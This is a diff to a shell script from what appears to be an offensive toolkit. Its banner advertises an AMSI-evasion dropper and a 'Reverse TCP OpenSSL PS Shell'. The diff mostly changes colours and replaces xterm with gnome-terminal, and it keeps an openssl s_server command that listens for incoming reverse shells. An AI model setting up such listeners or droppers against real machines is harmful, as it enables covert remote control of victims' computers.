@@ -28,6 +28,9 @@ Escape="\033";
   YellowF="${Escape}[33m";
   BlueF="${Escape}[34m";
   CyanF="${Escape}[36m";
+  RedBg="${Escape}[1;3;7;31m";
+  CyanBg="${Escape}[1;3;7;36m";
+  GreenBg="${Escape}[1;3;7;32m";
 Reset="${Escape}[0m";
 }
 Colors;
@@ -53,8 +56,8 @@ echo "    LPORT       : $LPORT"
 echo "    LHOST       : $LHOST"
 echo "    CN DOMAIN   : $DOMAIN"
 echo "    CERTIFICATES: cert.pem + key.pem"
-echo "    ACTIVE ON   : ${RedF}$FIRST_ACCESS${BlueF}"
-echo "    LAST ACCESS : ${CyanF}$LAST_ACCESS${BlueF}"
+echo "    ACTIVE ON   : ${RedBg}$FIRST_ACCESS${Reset}${BlueF}"
+echo "    LAST ACCESS : ${CyanBg}$LAST_ACCESS${Reset}${BlueF}"
 echo "    DROPPERNAME : $DROPPER"
 echo "    CATEGORIE   : Amsi Evasion (agent nº2)"
 echo "    DESCRIPTION : Reverse TCP OpenSSL PS Shell"
@@ -69,7 +72,7 @@ cls
 ## Persistence Start handler Function
 sh_Start () {
 echo "${YellowF}Waiting for ${BlueF}TCP${YellowF} connection ..";sleep 1
-xterm -T " OPENSSL LISTENER => $LHOST:$LPORT" -geometry 110x23 -e "echo Domain-Name : $DOMAIN;echo Certficates : key.pem + cert.pem;echo Listening on: $LHOST:$LPORT;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $LPORT"
+gnome-terminal --title="OPENSSL LISTENER => $LHOST:$LPORT" --geometry=90x21 --wait -- sh -c "echo Domain-Name : $DOMAIN;echo Certficates : key.pem + cert.pem;echo Listening on: $LHOST:$LPORT;echo ;openssl s_server -quiet -key key.pem -cert cert.pem -port $LPORT" > /dev/null 2>&1
 
 ## Config this handler settings
 dtr=$(date|awk {'print $2,$3,$4,$5'})
